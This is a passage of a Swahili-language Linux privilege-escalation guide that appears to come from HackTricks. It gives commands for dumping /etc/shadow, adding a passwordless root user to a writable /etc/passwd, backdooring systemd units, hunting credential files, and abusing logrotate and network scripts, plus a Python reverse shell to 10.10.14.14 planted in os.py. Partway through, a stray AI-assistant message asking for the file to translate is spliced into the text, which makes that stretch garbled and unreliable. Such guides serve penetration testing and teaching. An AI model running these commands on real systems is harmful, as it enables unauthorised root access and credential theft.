cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili `/etc/passwd` (au faili sawa).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Inayoweza kuandikwa /etc/passwd

Kwanza, tengeneza password kwa kutumia moja ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the contents of src/linux-hardening/privilege-escalation/README.md — please paste the file text you want translated.

Also clarify how you want the new user added in the translated file:
- Do you want me to append a line (or code block) that shows:
  - username: `hacker`
  - a generated password (plain text) — specify length and whether to include symbols
- Or do you want an actual instruction/command to create the user on a system? (I can show the text/command, but I won't run anything on your system.)

Tell me the file content and your preference for the password (e.g., 16 chars, include symbols), and I will produce the translated README with the requested addition.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` na `hacker:hacker`

Mbali na hayo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji wa bandia bila nenosiri.\
ONYO: unaweza kupunguza usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Kumbuka: Katika majukwaa ya BSD `/etc/passwd` iko katika `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imebadilishwa jina kuwa `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, je, unaweza kuandika katika faili ya **usanidi ya huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha seva ya **tomcat** na unaweza **badilisha faili ya usanidi ya huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kubadilisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itaendeshwa mara inayofuata tomcat itakapozinduliwa.

### Kagua Folda

Folda zifuatazo zinaweza kuwa na nakala rudufu au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda huwezi kusoma ile ya mwisho, lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali Isiyo ya Kawaida/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika za hivi punde
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml mafayela
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Mafaili yaliyofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Chelezo**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zinazojulikana zinazoweza kuwa na passwords

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazowezekana ambazo zinaweza kuwa na passwords**.\
**Chombo kingine cha kuvutia** ambacho unaweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambacho ni programu ya chanzo wazi inayotumika kupata passwords nyingi zinazohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Logs

Iwapo unaweza kusoma logs, unaweza kupata **taarifa za kuvutia/za siri ndani yao**. Kadri log inavyokuwa ya ajabu zaidi, ndivyo itakavyokuwa ya kuvutia zaidi (pengine).\
Pia, baadhi ya "**bad**" configured (backdoored?) **audit logs** zinaweza kuruhusu wewe **kurekodi passwords** ndani ya audit logs kama ilivyoelezwa katika chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma logs, kikundi** [**adm**](interesting-groups-linux-pe/index.html#adm-group) kitakuwa msaada mkubwa.

### Faili za Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Unapaswa pia kutafuta faili zilizo na neno "**password**" katika **jina** lao au ndani ya **yaliyomo**, na pia kutafuta IPs na emails ndani ya logs, au regex za hashes.\
Sitaorodhesha hapa jinsi ya kufanya yote haya lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Faili zinazoweza kuandikwa

### Python library hijacking

Ikiwa unajua **mahali** ambako script ya python itaendeshwa na unaweza **kuandika ndani** ya folda hiyo au unaweza **kuhariri maktaba za python**, unaweza kubadilisha maktaba ya OS na kuiweka backdoor (kama unaweza kuandika mahali ambapo script ya python itaendeshwa, nakili na uweke maktaba os.py).

Ili **backdoor the library**, ongeza tu mwishoni mwa maktaba os.py mstari ufuatao (badili IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Hitilafu katika `logrotate` inawawezesha watumiaji wenye **idhinisho za kuandika** kwenye faili la logi au saraka zake za mzazi kupata kwa uwezekano ruhusa za juu. Hii ni kwa sababu `logrotate`, mara nyingi ikifanya kazi kama **root**, inaweza kudhibitiwa ili kutekeleza faili yoyote, hasa kwenye saraka kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua ruhusa si tu katika _/var/log_ bali pia katika saraka yoyote ambayo mzunguko wa logi unatumika.

> [!TIP]
> Hitilafu hii inaathiri toleo la `logrotate` `3.18.0` na zile za awali

Maelezo ya kina kuhusu hitilafu yanaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia hitilafu hii kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Hitilafu hii ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** hivyo unapogundua kwamba unaweza kubadilisha logs, angalia nani anayesimamia logs hizo na angalia kama unaweza kupandisha ruhusa kwa kubadilisha logs na symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote, mtumiaji anaweza **kuandika** script ya `ifcf-<whatever>` katika _/etc/sysconfig/network-scripts_ **au** anaweza **kurekebisha** iliyopo, basi **system is pwned**.

Network scripts, _ifcg-eth0_ kwa mfano hutumika kwa muunganisho wa mtandao. Zinaonekana kama faili za .INI. Hata hivyo, zina \~sourced\~ kwenye Linux na Network Manager (dispatcher.d).

Katika kesi yangu, `NAME=` iliyowekwa katika network scripts hizi haisindikwi kwa usahihi. Ikiwa kuna **nafasi tupu ndani ya jina, mfumo unajaribu kutekeleza sehemu iliyofuata baada ya nafasi hiyo**. Hii inamaanisha kwamba **kila kitu kilicho baada ya nafasi tupu ya kwanza kinafanyika kama root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya wa **service management** uliotangazwa na Ubuntu, unaotumia faili za konfigurasi kwa kazi za usimamizi wa service. Licha ya mabadiliko kwenda Upstart, scripts za SysVinit bado zinatumiwa pamoja na konfigurasi za Upstart kutokana na safu ya ulinganifu ndani ya Upstart.

**systemd** inajitokeza kama msimamizi wa kisasa wa initialization na service, ikitoa vipengele vya juu kama kuanzisha daemons kwa mahitaji (on-demand), usimamizi wa automount, na snapshots za hali ya mfumo. Inapanga faili ndani ya `/usr/lib/systemd/` kwa ajili ya packages za distribution na `/etc/systemd/system/` kwa mabadiliko ya msimamizi, ikirahisisha kazi za utawala wa mfumo.

## Mbinu nyingine

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks kwa kawaida hufunga syscall ili kufichua utendaji wa kernel wenye mamlaka kwa manager wa userspace. Uthibitishaji dhaifu wa manager (mfano, ukaguzi wa signature kulingana na FD-order au mifumo duni ya password) unaweza kumruhusu app ya ndani kujifanya manager na kufanya escalate to root kwenye vifaa ambavyo tayari vime-root. Jifunze zaidi na maelezo ya exploitation hapa:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery katika VMware Tools/Aria Operations inaweza kutoa path ya binary kutoka kwa mistari ya amri ya process na kuiendesha kwa kutumia -v chini ya muktadha wenye mamlaka. Mifumo yenye pattern zilizo permissive (mfano, kutumia \S) zinaweza kuendana na listeners waliowekwa na attacker katika maeneo yenye uwezo wa kuandikwa (mfano, /tmp/httpd), na kusababisha execution kama root (CWE-426 Untrusted Search Path).

Jifunze zaidi na uone sample ya pattern itumike pia kwa discovery/monitoring stacks nyingine hapa:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
